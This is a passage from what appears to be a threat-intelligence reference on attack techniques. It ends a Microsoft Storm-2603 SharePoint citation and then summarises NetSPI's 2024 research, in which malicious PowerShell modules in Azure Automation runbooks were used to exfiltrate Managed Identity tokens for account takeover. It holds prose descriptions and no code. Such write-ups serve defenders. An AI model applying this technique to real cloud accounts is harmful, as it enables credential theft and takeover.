- **Reference:** [Microsoft Security Blog - Storm-2603](https://www.microsoft.com/en-us/security/blog/2025/07/22/disrupting-active-exploitation-of-on-premises-sharepoint-vulnerabilities)

#### Example 2: NetSPI Azure Automation Backdoor Research (2024)

- **Target:** Research/PoC environment
- **Timeline:** September 2024
- **Technique Usage:** Created malicious PowerShell modules and uploaded them to Automation Account. Used runbooks to exfiltrate Managed Identity tokens.
- **Impact:** Demonstrated complete account takeover via token theft and credential exfiltration
- **Reference:** [NetSPI - Backdooring Azure Automation](https://www.netspi.com/blog/technical-blog/cloud-pentesting/backdooring-azure-automation-account-packages-and-runtime-environmen)

---